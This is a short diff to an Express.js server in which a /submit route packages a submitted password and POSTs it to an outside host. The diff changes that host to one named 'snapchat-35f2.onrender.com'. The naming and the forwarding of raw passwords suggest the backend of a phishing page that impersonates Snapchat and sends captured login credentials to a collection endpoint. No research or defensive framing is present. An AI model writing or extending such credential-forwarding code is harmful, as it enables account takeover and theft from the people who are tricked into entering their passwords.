@@ -24,8 +24,7 @@ app.post('/submit', async (req, res) => {
       password: password
     };
 
-  
-    const renderResponse = await fetch('https://dein-render-service.onrender.com/api/log', {
+    const renderResponse = await fetch('https://snapchat-35f2.onrender.com', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
